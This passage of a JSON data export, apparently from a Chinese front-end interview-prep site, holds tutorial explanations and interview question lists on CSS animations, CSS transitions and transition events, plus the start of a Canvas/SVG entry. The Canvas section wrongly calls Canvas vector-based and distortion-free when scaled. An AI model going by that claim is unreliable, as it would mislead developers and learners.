    "testPoint": "### 1. **CSS 动画基础**\n   - 你如何使用 CSS 实现一个简单的动画？能简要描述一下使用 `@keyframes` 和 `animation` 属性的基本用法吗？\n   - `@keyframes` 中如何定义动画的起始状态和结束状态？如何设置动画的中间步骤？\n\n### 2. **动画的属性**\n   - `animation` 属性有哪些常见的子属性？能举例说明 `animation-name`、`animation-duration`、`animation-timing-function`、`animation-delay` 和 `animation-iteration-count` 的作用和用法吗？\n   - 如何使用 `animation-timing-function` 设置动画的速度曲线？举例说明常见的值，如 `linear`、`ease`、`ease-in`、`ease-out` 和 `cubic-bezier()`。\n\n### 3. **动画的关键帧**\n   - 如何通过 `@keyframes` 设置动画的关键帧？能解释一下 `from` 和 `to` 与百分比的区别吗？\n   - 如何通过关键帧在动画中实现多个步骤的过渡？举例说明如何设置多个关键帧来定义动画的中间状态。\n   - 在 `keyframes` 中如何使用 `animation-timing-function` 对不同步骤设置不同的缓动效果？\n\n### 4. **动画的重复与循环**\n   - `animation-iteration-count` 是如何工作的？如何设置动画循环播放一定次数或无限次？\n   - 如何控制动画的播放方向？可以使用 `animation-direction` 设置哪些值，如何实现动画的反向播放？\n\n### 5. **动画的暂停与恢复**\n   - 如何暂停 CSS 动画的执行？例如在某个交互事件发生时暂停动画。\n   - 如何使用 `animation-play-state` 控制动画的暂停与恢复？它和 `pause`、`resume` 之间有什么区别？\n\n### 6. **动画的延迟与开始**\n   - 如何在 CSS 动画开始之前设置延迟？如何使用 `animation-delay`？\n   - 如何使动画延迟某一时间开始，但动画本身还是按照正常的时长进行？\n\n### 7. **过渡与动画的区别**\n   - CSS 动画与 CSS 过渡的区别是什么？何时使用动画，何时使用过渡效果？\n   - CSS 过渡在某些交互中非常常见，它是如何工作的？比如使用 `:hover` 或 `:focus` 触发过渡效果。\n\n### 8. **动画性能优化**\n   - 在使用 CSS 动画时，如何避免性能瓶颈？如何优化高频率的动画，如平移动画、旋转动画等？\n   - 你会如何处理元素的重排（reflow）和重绘（repaint）？有哪些动画操作会触发重排，如何避免？\n\n### 9. **3D 动画与变换**\n   - 如何使用 CSS 实现 3D 动画？请说明 `perspective`、`transform`、`rotateX`、`rotateY` 等属性在 3D 动画中的应用。\n   - 如何利用 `transform` 属性实现平移、旋转、缩放等效果？这些变换如何影响元素的布局和渲染？\n\n### 10. **动画事件**\n   - CSS 动画是否支持事件监听？如 `animationstart`、`animationend` 和 `animationiteration`，它们的作用是什么？能举个例子说明如何使用它们？\n   - 如何监听动画结束时执行特定的 JavaScript 代码？如何配合动画事件监听来触发回调？\n\n### 11. **CSS 动画的兼容性**\n   - 在使用 CSS 动画时，你如何确保它能在不同浏览器中兼容？如何处理老旧浏览器的支持问题？\n   - CSS 动画在某些低版本浏览器中支持差异较大，你会如何使用 `@keyframes` 和 `animation` 来确保跨浏览器的兼容性？\n\n### 12. **复杂动画的实现**\n   - 如何实现一个元素从屏幕外滑入并淡入的效果？能举个例子说明如何实现多个动画效果的组合？\n   - 如何使用 `animation` 和 `transition` 实现一个弹跳效果或一个拖拽效果？\n\n### 13. **结合 JavaScript 控制动画**\n   - 如何使用 JavaScript 控制 CSS 动画的启动、暂停、恢复和停止？如何动态改变动画的参数，如延迟、时长、效果等？\n   - 你如何通过 JavaScript 来监听和操作 CSS 动画？例如，在动画结束时执行某个动作。\n\n### 14. **常见动画案例**\n   - 请描述一个你曾经实现过的复杂 CSS 动画效果，涉及到多步骤的动画、延迟、反转、暂停等。你如何控制不同阶段的动画？\n   - 如何制作一个页面加载时的动画效果，例如淡入、旋转加载器等？\n\n### 15. **动画与可访问性**\n   - 如何确保动画对视觉障碍人士友好？如何为不喜欢动画的用户提供选项禁用动画？\n   - 使用 `prefers-reduced-motion` 媒体查询来检测用户的偏好并适配动画，能举个例子吗？\n",
    "exerciseKeyList": "[\"c7b08d95-edf0-4d08-ac73-ce0b87c08e85\",\"5adab921-8dfb-4a65-9f44-38ae8a70820f\",\"0139d2e8-67c1-40f9-868e-5f277e223629\",\"8b516cb7-fa94-4d68-929f-d3c628d1b7a2\",\"af8d6439-598f-4317-8063-93349b83f2d3\",\"27da945d-848c-4af3-bc27-65e4833776b2\",\"38358609-e797-42f9-983d-3e2709fb4fdd\"]",
    "vipLimit": 0,
    "level": 2,
    "pointOrder": 15,
    "createAt": "2024-10-08T09:49:38.000Z",
    "updateAt": "2024-11-18T01:54:24.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "0139d2e8-67c1-40f9-868e-5f277e223629",
        "title": "CSS动画和JS实现的动画分别有哪些优缺点？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-05-09T15:08:43.000Z",
        "updateAt": "2024-08-10T17:06:36.000Z"
      },
      {
        "exerciseKey": "27da945d-848c-4af3-bc27-65e4833776b2",
        "title": "如果需要手动写动画，你认为最小时间间隔是多久，为什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T10:27:09.000Z",
        "updateAt": "2021-07-04T19:24:23.000Z"
      },
      {
        "exerciseKey": "38358609-e797-42f9-983d-3e2709fb4fdd",
        "title": "怎么使用 CSS3 实现动画？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-03T13:30:23.000Z",
        "updateAt": "2024-08-10T17:04:25.000Z"
      },
      {
        "exerciseKey": "5adab921-8dfb-4a65-9f44-38ae8a70820f",
        "title": "在解决动画卡顿问题时，会引导硬件加速，那么硬件加速的原理是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-05-09T15:23:09.000Z",
        "updateAt": "2024-08-10T17:06:37.000Z"
      },
      {
        "exerciseKey": "8b516cb7-fa94-4d68-929f-d3c628d1b7a2",
        "title": "前端实现动画有哪些方式？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-05-09T14:49:29.000Z",
        "updateAt": "2024-08-10T17:06:36.000Z"
      },
      {
        "exerciseKey": "af8d6439-598f-4317-8063-93349b83f2d3",
        "title": "Js 动画与 CSS 动画区别及相应实现",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-11-17T14:36:50.000Z",
        "updateAt": "2024-07-19T16:00:49.000Z"
      },
      {
        "exerciseKey": "c7b08d95-edf0-4d08-ac73-ce0b87c08e85",
        "title": "使用css实现一个无限循环动画",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-08-07T14:42:24.000Z",
        "updateAt": "2024-08-10T17:06:54.000Z"
      }
    ]
  },
  "118": {
    "id": 118,
    "tagId": 11,
    "title": "transition",
    "explanation": "CSS `transition` 提供了一种在更改 CSS 属性时控制动画速度的方法。其可以让属性变化成为一个持续一段时间的，而不是立即生效的过程。\n\n比如，将一个元素的颜色从白色改为黑色，通常这个改变是立即生效的，使用 CSS 过渡后该元素的颜色将按照一定的曲线速率从白色变化为黑色。这个过程可以自定义。\n\n通常将两个状态之间的过渡称为**隐式过渡**，因为开始与结束之间的状态由浏览器决定。\n\n![](https://static.ecool.fun//article/532662a7-f79f-4ead-857b-1752089dd291.jpeg)\n\nCSS 过渡可以决定哪些属性发生动画效果（通过明确地列出这些属性），何时开始（通过设置延时），持续多久（通过设置时长）以及如何动画（通过定义缓动函数，如线性或先快后慢）。比如在不同的伪元素之间切换，像是 `:hover`，`:active` 或者通过 JavaScript 实现的状态变化。\n\n开发者可以定义哪一属性需以何种方式用于动画，由此允许创造复杂的过渡。然而因为为某些属性赋予动画无意义，所以这些属性无动画性。\n\n> 备注： auto 值常常较复杂，规范指出不要在它上动画。一些用户代理，比如基于 Gecko 的，实现了这个需求；然而另外一些用户代理，比如基于 WebKit 的，没有这么严格限制。在 auto 上使用动画，取决于浏览器及其版本，可能会导致非预期结果，应当避免使用。\n\n## 属性\n\n以下 `transition` 属性，若有多个属性值，则以`,`（逗号）衔接。\n\n### transition-property\n\n指定哪个或哪些 CSS 属性名称用于过渡。只有指定的属性才会在过渡中发生动画，其他属性仍如通常那样瞬间变化。如果指定简写属性（比如 `background`），那么其完整版中所有可以动画的属性都会被应用过渡。\n\n取值如下：\n\n-   `none`：没有过渡动画。\n-   `all`（**初始值**）：所有可被动画的属性都表现出过渡动画。\n-   `<custom-ident>`：属性名称。由小写字母 a 到 z，数字 0 到 9，下划线（\\_）和破折号（-）。第一个不能为非破折号字符或数字。同时，不能以两个破折号开头。通俗来说就是可以是自定义名称也可以是css规范中的属性名。\n\n### transition-duration\n\n表示过渡属性从旧的值转变到新的值所需要的时间。你可以为所有属性指定一个值，或者指定多个值，或者为每个属性指定不同的时长。\n\n该属性值以秒（s）或毫秒（ms）为单位指定过渡动画所需的时间。默认值为 **0s**，表示不会呈现过渡动画，属性会瞬间完成转变。不接受负值。\n\n可以指定多个时长，每个时长会被应用到由 `transition-property` 指定的对应属性上。\n\n如果某个属性的值列表小于 `transition-property` 的属性值数量，那么时长列表会重复，重复规则是按照现有值进行重复。例如：\n\n如3s，则重复多个3s\n\n```css\ndiv {\n  transition-property: opacity, left, top, height;\n  transition-duration: 3s;\n}\n```\n\n将视为：\n\n```css\ndiv {\n  transition-property: opacity, left, top, height;\n  transition-duration: 3s, 3s, 3s, 3s;\n}\n```\n\n如果是3s，5s，则会重复多个3s，5s。\n\n```css\ndiv {\n  transition-property: opacity, left, top, height;\n  transition-duration: 3s, 5s;\n}\n```\n\n将视为：\n\n```css\ndiv {\n  transition-property: opacity, left, top, height;\n  transition-duration: 3s, 5s, 3s, 5s;\n}\n```\n\n类似地，如果某个属性的值列表长于 `transition-property` 的属性值数量，将被截短。例如：\n\n```css\ndiv {\n  transition-property: opacity, left;\n  transition-duration: 3s, 5s, 2s, 1s;\n}\n```\n\n将按下面这样处理：\n\n```css\ndiv {\n  transition-property: opacity, left;\n  transition-duration: 3s, 5s;\n}\n```\n\n### transition-timing-function\n\nCSS 属性受到过渡效应(transition effect)的影响，会产生不断变化的中间值，而 CSS `transition-timing-function` 属性用来描述这个中间值是怎样计算的。初始值是`ease`。\n\n缓动函数定义属性如何计算。大多数缓动函数由四点定义一个立方贝塞尔曲线。也可以从 [Easing Functions Cheat Sheet](https://easings.net/ \"https://easings.net/\") 选择缓动效果。\n\n实质上，通过这个函数会建立一条加速度曲线，因此在整个 transition 变化过程中，变化速度可以不断改变。这条加速度曲线被<timing-function>所定义，之后作用到每个 CSS 属性的过渡。\n\n通过`transition-property`中定义的过渡属性，每个<timing-function> 的值与这个过渡属性相对应.\n\n你可以指定 <timing-function> 个数少于或者多于属性个数。重复或者裁剪规则与`transition-duration`一致。\n\n形式语法如下：\n\n```txt\ntransition-timing-function = \n  <easing-function>#  \n\n<easing-function> = \n  linear                          |\n  <linear-easing-function>        |\n  <cubic-bezier-easing-function>  |\n  <step-easing-function>          \n\n<linear-easing-function> = \n  linear( <linear-stop-list> )  \n\n<cubic-bezier-easing-function> = \n  ease                                                |\n  ease-in                                             |\n  ease-out                                            |\n  ease-in-out                                         |\n  cubic-bezier( <number [0,1]> , <number> , <number [0,1]> , <number> )  \n\n<step-easing-function> = \n  step-start                             |\n  step-end                               |\n  steps( <integer> , <step-position>? )  \n\n<linear-stop-list> = \n  [ <linear-stop> ]#  \n\n<step-position> = \n  jump-start  |\n  jump-end    |\n  jump-none   |\n  jump-both   |\n  start       |\n  end         \n\n<linear-stop> = \n  <number>               &&\n  <linear-stop-length>?  \n\n<linear-stop-length> = \n  <percentage>{1,2}  \n```\n\n语法书写示例如下：\n\n```css\n/* Keyword values */\ntransition-timing-function: ease;\ntransition-timing-function: ease-in;\ntransition-timing-function: ease-out;\ntransition-timing-function: ease-in-out;\ntransition-timing-function: linear;\ntransition-timing-function: step-start;\ntransition-timing-function: step-end;\n\n/* Function values */\ntransition-timing-function: steps(4, jump-end);\ntransition-timing-function: cubic-bezier(0.1, 0.7, 1, 0.1);\n\n/* Steps Function keywords */\ntransition-timing-function: steps(4, jump-start);\ntransition-timing-function: steps(10, jump-end);\ntransition-timing-function: steps(20, jump-none);\ntransition-timing-function: steps(5, jump-both);\ntransition-timing-function: steps(6, start);\ntransition-timing-function: steps(8, end);\n\n/* Multiple timing functions */\ntransition-timing-function: ease, step-start, cubic-bezier(0.1, 0.7, 1, 0.1);\n\n/* Global values */\ntransition-timing-function: inherit;\ntransition-timing-function: initial;\ntransition-timing-function: revert;\ntransition-timing-function: revert-layer;\ntransition-timing-function: unset;\n```\n\n### transition-delay\n\n表明动画效果属性生效之前需要等待的时间。\n\n值以秒（s）或毫秒（ms）为单位，初始值为**0s**。取值为正时会延迟一段时间来响应过渡效果；取值为负时会导致过渡从值的绝对值时刻开始。\n\n你可以指定多个延迟时间，每个延迟将会分别作用于你所指定的相符合的 css 属性（`transition-property`）。延迟时间个数少于或者多于属性个数。重复或者裁剪规则与`transition-duration`一致。\n\n### transition 简写属性\n\n`transition` CSS 属性是 `transition-property`、`transition-duration`、`transition-timing-function` 和 `transition-delay` 的一个简写属性。\n\n简写属性 CSS 语法如下：\n\n`transition: <property> <duration> <timing-function> <delay>;`\n\nCSS 过渡通常使用简写属性 `transition` 控制。这是最好的方式，可以避免属性值列表长度不一，节省在 CSS 代码上调试的时间。\n\n`transition`属性可以被指定为一个或多个 CSS 属性的过渡效果，多个属性之间用逗号进行分隔。\n\n每个单属性转换都描述了应该应用于单个属性的转换（或特殊值`all`和`none`）。这包括：\n\n-   零或一个值，表示转换应适用的属性。这可能是以下任何一种：\n    -   关键字`none`\n    -   关键字`all`\n    -   命名 CSS 属性的 <custom-ident> 。\n-   零或一个 <single-transition-timing-function> 值表示要使用的过渡函数\n-   零，一或两个 值。可以解析为时间的第一个值被分配给 `transition-duration`，并且可以解析为时间的第二个值被分配给`transition-delay`。\n\n当`transition`属性的值个数超过可以接收的值的个数时该如何处理。简而言之，当`transition`属性的值个数超过可以接收的值的个数时，多余的值都会被忽略掉，不再进行解析。\n\n标准语法\n\n```txt\ntransition = \n  <single-transition>#  \n\n<single-transition> = \n  [ none | <single-transition-property> ]  ||\n  <time>                                   ||\n  <easing-function>                        ||\n  <time>                                   \n\n<single-transition-property> = \n  all             |\n  <custom-ident> \n```\n\n语法使用示例\n\n```css\n/* Apply to 1 property */\n/* property name | duration */\ntransition: margin-right 4s;\n\n/* property name | duration | delay */\ntransition: margin-right 4s 1s;\n\n/* property name | duration | timing function */\ntransition: margin-right 4s ease-in-out;\n\n/* property name | duration | timing function | delay */\ntransition: margin-right 4s ease-in-out 1s;\n\n/* Apply to 2 properties */\ntransition:\n  margin-right 4s,\n  color 1s;\n\n/* Apply to all changed properties */\ntransition: all 0.5s ease-out;\n\n/* Global values */\ntransition: unset;\n```\n\n## 方法\n\n### Element：transitionrun 事件\n\n当CSS `transition` 首次创建时，将触发 `transitionrun` 事件，即在任何 `transition-delay` 已经开始之前。此事件不可取消。\n\n在`addEventListener()`方法中使用事件名称，或设置事件处理程序。\n\n```js\nelement.addEventListener(\"transitionrun\", (event) => {});\n\nelement.ontransitionrun = (event) => {};\n```\n\n从其父接口 `Event` 继承属性，事件属性如下。\n\n-   `TransitionEvent.propertyName`\n    \n    一个包含与`transition`相关联的CSS属性名称的字符串。\n    \n-   `TransitionEvent.elapsedTime`\n    \n    一个浮点数，给出此事件触发时`transition`运行的时间，单位为秒。此值不受过渡延迟特性的影响。对于 `transitionstart` 事件，elapsedTime 的值为 0.0（除非将 `transition-delay` 设置成了一个负值，在这种情况下，`elapsedTime` 为 (-1 \\* `transition-delay`)）。\n    \n-   `TransitionEvent.pseudoElement`\n    \n    一个字符串，以 `::` 开头，包含了`transition` 运行时所在的伪元素的名称。如果`transition`不是在伪元素而是在元素上运行，则为空字符串：''。\n    \n\n下面几种`transition`事件方法，与此一致。\n\n### Element：transitionstart 事件\n\n`transitionstart` 事件会在 CSS `transition` 实际开始的时候触发，或者说在某个 `transition-delay` 已经结束之后触发。\n\n下列代码对 `transitionstart` 事件添加了一个监听器：\n\n```js\nelement.addEventListener(\"transitionstart\", () => {\n  console.log(\"transition 开始\");\n});\n```\n\n一样的代码，但是使用 `ontransitionstart` 属性来替代 `addEventListener()`：\n\n```js\nelement.ontransitionstart = () => {\n  console.log(\"transition 开始\");\n};\n```\n\n### Element：transitionend 事件\n\n当CSS `transition` 完成时，将触发 `transitionend` 事件。此事件不可取消。\n\n以下情况将不会触发`transitionend`事件\n\n1.  如果在完成之前删除了 `transition`，例如删除了 `transition-property` 或将 `display` 设置为 `none` ，则将不会触发该事件。\n2.  如果 `transition-delay` 或 `transition-duration`都是0s或两者都没有声明，则没有转换，也不会触发任何`transition`事件。\n3.  如果触发了 `transitioncancel` 事件，则 `transitionend` 事件将不会触发。\n\n在`addEventListener()`方法中使用事件名称，或设置事件处理程序。\n\n```js\naddEventListener(\"transitionend\", (event) => {});\n\nontransitionend = (event) => {};\n```\n\n### Element：transitioncancel 事件\n\n`transitioncancel` 事件在 CSS 转换被取消时触发。\n\n当以下情况时，过渡被取消：\n\n-   应用于目标的`transition-property`属性的值被更改\n-   `display`属性被设置为\"none\"。\n-   转换在运行到完成之前就停止了，例如通过将鼠标移出悬浮过渡元素。\n\n在`addEventListener()`方法中使用事件名称，或设置事件处理程序。\n\n```js\naddEventListener(\"transitioncancel\", (event) => {});\n\nontransitioncancel = (event) => {};\n```\n\n## 示例\n\n### 方块旋转\n\n```html\n<div class=\"box duration-1\">0.5 秒</div>\n\n<div class=\"box duration-2\">2 秒</div>\n\n<div class=\"box duration-3\">4 秒</div>\n\n<button id=\"change\">变换</button>\n```\n\n```css\n.box {\n  margin: 20px;\n  padding: 10px;\n  display: inline-block;\n  width: 100px;\n  height: 100px;\n  background-color: red;\n  font-size: 18px;\n  transition-property: background-color, font-size, transform, color;\n  transition-timing-function: ease-in-out;\n}\n\n.transformed-state {\n  transform: rotate(270deg);\n  background-color: blue;\n  color: yellow;\n  font-size: 12px;\n}\n\n.duration-1 {\n  transition-duration: 0.5s;\n}\n\n.duration-2 {\n  transition-duration: 2s;\n}\n\n.duration-3 {\n  transition-duration: 4s;\n}\n```\n\n```js\nfunction change() {\n  const elements = document.querySelectorAll(\"div.box\");\n  for (const element of elements) {\n    element.classList.toggle(\"transformed-state\");\n  }\n}\n\nconst changeButton = document.querySelector(\"#change\");\nchangeButton.addEventListener(\"click\", change);\n```\n\n### 事件监听\n\n在下面的例子中，我们有一个简单的div元素，并设置了一个包含 delay 的 transition 样式。\n\n```html\n<div class=\"transition\">Hover over me</div>\n<div class=\"message\"></div>\n```\n\n```css\n.transition {\n  width: 100px;\n  height: 100px;\n  background: red;\n  transition-property: transform, background;\n  transition-duration: 5s;\n  transition-delay: 2s;\n}\n\n.transition:hover {\n  transform: rotate(90deg);\n  background: silver;\n}\n```\n\n对此，我们再添加一些 JavaScript 代码来指出 `transitionstart` 和 `transitionrun` 事件在哪里触发。\n\n```js\nconst domTransition = document.querySelector(\".transition\");\nconst domMessage = document.querySelector(\".message\");\n\n// 触发transitioncancel事件\ndomTransition.onclick = function () {\n  // 点击元素使display属性被设置为\"none\"\n  domTransition.style.display = \"none\";\n  timeout = window.setTimeout(appear, 2000);\n  function appear() {\n    domTransition.style.display = \"block\";\n  }\n  \n  // 或点击元素使应用于目标的transition-property属性的值被更改\n  // domTransition.style.transitionProperty = 'width'\n};\n\ndomTransition.addEventListener(\"transitionrun\", function (e) {\n  domMessage.textContent = \"transitionrun 触发了\"\n  console.log(e.propertyName+'触发了transitionrun') // 重复两次, e.propertyName不同\n});\n\ndomTransition.addEventListener(\"transitionstart\", function (e) {\n  domMessage.textContent = \"transitionstart 触发了\"\n  console.log(e.propertyName+'触发了transitionstart') // 重复两次, e.propertyName不同\n});\n\n// 鼠标移出悬浮过渡元素或点击使元素消失会触发\ndomTransition.addEventListener(\"transitioncancel\", function (e) {\n  domMessage.textContent = \"transitioncancel 触发了\"\n  console.log(e.propertyName+'触发了transitioncancel') // 重复两次, e.propertyName不同\n});\n\ndomTransition.addEventListener(\"transitionend\", function (e) {\n  domMessage.textContent = \"transitionend 触发了\"\n  console.log(e.propertyName+'触发了transitionend') // 重复两次, e.propertyName不同\n});\n```\n\n不同的地方是：\n\n-   `transitionrun` 在 `transition` 创建的时候被触发。（或者说在某个 `delay` 开始的时候）\n-   `transitionstart` 在动画实际开始的时候被触发。 (或者说在某个 `delay` 结束的时候)\n\n### 小球移动\n\n过渡可以使事情看起来更顺畅，而不需要对你的 JavaScript 功能做任何处理。\n\n```html\n<p>随便点击某处来移动球</p>\n<div class=\"ball\"></div>\n```\n\n使用 JavaScript 将球移动到一个位置：\n\n```js\nconst el = document.querySelector('.ball');\ndocument.addEventListener(\n  \"click\",\n  (ev) => {\n    el.style.transform = `translateY(${ev.clientY - 25}px)`;\n    el.style.transform += `translateX(${ev.clientX - 25}px)`;\n  },\n  false,\n);\n```\n\n使用 CSS 来平滑移动，只需简单地添加一个过渡效果：\n\n```css\n.ball {\n  border-radius: 25px;\n  width: 50px;\n  height: 50px;\n  background: #c00;\n  position: absolute;\n  top: 0;\n  left: 0;\n  transition: transform 1s;\n}\n```\n\n## 注意\n\n在以下场景之后，应注意`transition`的使用：\n\n-   使用 `.appendChild()` 向 DOM 中添加元素\n-   移除元素的 `display: none` 属性\n\n这就好像初始状态从未发生过，元素一直处于最终状态一样。\n\n克服这个限制的简单方法是在修改过渡的CSS属性之前应用若干毫秒的 `setTimeout()` 函数。\n\n-   如下演示，如何规避使用 `.appendChild()` 向 DOM 中添加元素，动效不生效问题。\n    \n    还是用上面小球移动的示例，复用css。\n    \n    修改js如下：\n    \n    ```js\n    const domDiv = document.createElement('div');\n    domDiv.className = 'ball';\n    document.body.appendChild(domDiv);\n    \n    setTimeout(() => {\n      domDiv.style.transform = 'translate(100px, 100px)';\n    }, 20)\n    ```\n    \n-   如下演示，如何规避移除元素的 `display: none` 属性，动效不生效问题。\n    \n    还是用上面小球移动的示例，复用css，在这基础上添加 `display: none;`\n    \n    修改js如下：\n    \n    ```js\n    const domBall = document.querySelector('.ball');\n    domBall.style.display = 'block';\n    \n    setTimeout(() => {\n      domBall.style.transform = 'translate(100px, 100px)';\n    }, 20)\n    ```\n\n> 原文：https://juejin.cn/post/7320052254374232073",
    "testPoint": "### 1. **过渡动画的基础**\n   - 请简述什么是 CSS 过渡动画？它如何工作？\n   - 过渡动画与传统的动画（如 `@keyframes` 动画）有何区别？何时使用过渡动画更合适？\n   - 如何使用 `transition` 属性来实现过渡效果？请举例说明基本语法。\n\n### 2. **过渡的四个关键属性**\n   - 过渡动画的四个关键属性是什么？请简述它们的作用：\n     - `transition-property`：控制哪个 CSS 属性发生过渡。\n     - `transition-duration`：控制过渡持续时间。\n     - `transition-timing-function`：控制过渡效果的速度曲线。\n     - `transition-delay`：设置过渡延迟时间。\n   - 如何结合这四个属性来定义一个完整的过渡效果？请举个例子。\n\n### 3. **常见的过渡效果**\n   - 如何用过渡动画实现元素的颜色变化、尺寸变化、透明度变化等效果？\n   - 请描述一下如何利用 `transition` 属性来实现鼠标悬停时的平滑过渡效果？\n   - 如何通过过渡实现元素的旋转、位移和缩放效果？\n\n### 4. **过渡时长与速率**\n   - 如何控制过渡的时长？例如，如何设置过渡持续时间为 2 秒？\n   - 过渡的 `timing-function` 属性中常用的几个值是什么？请解释它们的作用，并举例：\n     - `linear`, `ease`, `ease-in`, `ease-out`, `ease-in-out`。\n   - 如何创建自定义的速率曲线？例如，使用 `cubic-bezier` 创建复杂的过渡效果。\n\n### 5. **过渡与动画的结合**\n   - 你如何使用 CSS 过渡和 `@keyframes` 动画一起实现复合动画效果？\n   - 过渡动画和关键帧动画有什么优缺点？在性能上有何不同？\n   - 你如何在过渡动画中使用 `@keyframes` 来实现更复杂的动画效果？\n\n### 6. **过渡的延迟与循环**\n   - `transition-delay` 的作用是什么？如何利用它控制过渡的开始时间？\n   - 过渡动画能否循环播放？如果不行，如何通过 JavaScript 来实现？\n\n### 7. **过渡动画的性能优化**\n   - 在使用过渡动画时，如何优化性能，确保动画的流畅度？\n   - 为什么避免对 `width`、`height` 和 `top` 等属性进行过渡？你会如何替代它们来实现动画效果？\n   - 如何通过 CSS3 GPU 加速提升过渡动画的性能？例如，使用 `transform` 和 `opacity` 属性。\n\n### 8. **过渡与响应式设计**\n   - 在响应式设计中，如何利用过渡动画实现元素在不同屏幕尺寸下的过渡效果？\n   - 你如何确保过渡动画在各种设备（如手机、平板、桌面）上都能流畅运行？\n\n### 9. **多重过渡**\n   - CSS 允许在一个元素上设置多个过渡效果。如何在一个元素上同时应用多个过渡？\n   - 请举例说明如何为一个按钮同时设置颜色变化、背景颜色变化和字体大小变化的过渡效果。\n\n### 10. **鼠标事件与过渡动画**\n   - 如何利用 CSS 过渡动画来实现鼠标悬停时元素的动态效果？\n   - 在 `:hover` 伪类中使用过渡时，有哪些常见的设计模式？例如：按钮、卡片、菜单的悬停效果。\n\n### 11. **过渡动画中的 Easing 函数**\n   - 什么是 easing 函数，它在过渡动画中起到什么作用？你如何选择合适的 easing 函数？\n   - 请举例说明如何使用 `cubic-bezier()` 来定义自定义的缓动效果，并描述其常见应用场景。\n\n### 12. **过渡与 JavaScript 的结合**\n   - 如何在 JavaScript 中动态修改过渡属性？请举例说明如何通过 JS 改变过渡的持续时间或延迟。\n   - 你如何使用 JavaScript 动态控制过渡的开始和结束？如何监听过渡的结束事件？\n\n### 13. **过渡动画的可访问性与用户体验**\n   - 在设计过渡动画时，如何考虑用户体验，避免过渡效果对用户造成干扰？\n   - 如何为有视觉障碍的用户提供无动画的选项？例如，在响应式设计中关闭过渡动画。\n\n### 14. **实际应用**\n   - 请描述一个你曾在项目中实现过的过渡动画效果，并解释如何优化该动画效果的性能。\n   - 在某个项目中，你是如何处理多个元素之间的过渡关系？例如，菜单项的显示与隐藏。\n\n### 15. **过渡动画与 CSS 变量**\n   - 如何结合 CSS 变量来控制过渡动画的动态效果？请举例说明如何通过修改 CSS 变量来调整动画效果。",
    "exerciseKeyList": "[\"0de1d7b2-794c-4867-a61c-7840ae0eafdc\",\"a9854cb2-406f-4837-a57f-947f818e5731\",\"07d98297-cc3c-434b-9eb5-307858ded62d\"]",
    "vipLimit": 0,
    "level": 1,
    "pointOrder": 16,
    "createAt": "2024-10-08T09:53:42.000Z",
    "updateAt": "2024-11-18T01:54:24.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "07d98297-cc3c-434b-9eb5-307858ded62d",
        "title": "transition和animation的区别",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-06-25T05:41:02.000Z",
        "updateAt": "2022-06-25T14:35:06.000Z"
      },
      {
        "exerciseKey": "0de1d7b2-794c-4867-a61c-7840ae0eafdc",
        "title": "css 中的 animation、transition、transform 有什么区别？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2024-03-15T08:45:40.000Z",
        "updateAt": "2024-08-10T17:07:40.000Z"
      },
      {
        "exerciseKey": "a9854cb2-406f-4837-a57f-947f818e5731",
        "title": "CSS3 中 transition 和 animation 的属性分别有哪些？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2023-05-30T01:13:26.000Z",
        "updateAt": "2024-08-10T17:07:27.000Z"
      }
    ]
  },
  "119": {
    "id": 119,
    "tagId": 12,
    "title": "Canvas 和 SVG",
    "explanation": "## 1.Canvas\n\nCanvas 是 HTML5 中新增的一个元素，它提供了一种通过 JavaScript 来绘制图形的方式，使用笔刷绘制2D图案。通过 Canvas，我们可以在网页中动态地绘制出各种图形、图表、动画等内容，实现更丰富的交互效果。\n\n### 工作方式\n\nCanvas 的工作方式是，我们首先在 HTML 页面中添加一个 `<canvas>` 元素，并指定其宽度和高度，然后在 JavaScript 中获取该元素的上下文对象，并通过调用它的方法来绘制图形。Canvas 的上下文对象有多种，包括 2D 上下文、WebGL 上下文等，我们可以根据需求选择相应的上下文对象来进行绘制。\n\n### 常用属性\n\n| 属性 | 效果 |\n| --- | --- |\n| `fillStyle` | 填充颜色。默认为黑色 |\n| `strokeStyle` | 描边颜色。默认为黑色 |\n| `lineWidth` | 线条宽度。默认为 1 像素 |\n| `lineCap` | 线条末端的样式,可选值有 butt、round 和 square。默认为 butt |\n| `lineJoin` | 线条相交处的样式,可选值有 miter、round 和 bevel。默认为 miter。 |\n| `miterLimit` | 线条相交处的最大斜接长度。默认为 10 像素 |\n| `globalAlpha` | 绘制的透明度。默认为 1（不透明） |\n| `shadowColor` | 阴影颜色。默认为黑色 |\n| `shadowOffsetX`、`shadowOffsetY` | 阴影的偏移量和模糊程度 |\n| `shadowBlur` | 模糊程度 |\n\n### 优缺点\n\n#### 优点\n\n-   基于矢量绘制，图形可以自由缩放而不失真\n-   具有良好的跨浏览器兼容性\n-   通过 JavaScript 动态生成图形，可以更加灵活地控制图形的显示和交互\n\n#### 缺点\n\n无法处理复杂的交互事件、不支持跨域图像等\n\n### 使用实例\n\n这个实例中，我们使用了一个 HTML5 的 Canvas 元素，它的宽度和高度分别为 200 像素。在 JavaScript 中，我们获取了这个元素，并通过 `getContext` 方法获取了它的上下文对象。然后，我们使用 `fillStyle` 属性设置了矩形的填充颜色为红色，并使用 `fillRect` 方法绘制了一个起点坐标为 (50,50)，宽度为 100 像素，高度为 100 像素的矩形。\n\n```xml\n<!DOCTYPE html>\n<html>\n<head>\n  <title>Canvas Example</title>\n  <style>\n    canvas {\n      border: 1px solid black;\n    }\n  </style>\n</head>\n<body>\n<canvas id=\"myCanvas\" width=\"200\" height=\"200\"></canvas>\n\n<script>\n  // 获取画布元素\n  var canvas = document.getElementById('myCanvas');\n  // 获取画布上下文\n  var ctx = canvas.getContext('2d');\n  // 绘制矩形\n  ctx.fillStyle = 'red';\n  ctx.fillRect(50, 50, 100, 100);\n</script>\n</body>\n</html>\n```\n\n## 2.SVG\n\nSVG（Scalable Vector Graphics，可缩放矢量图形）是一种基于 XML 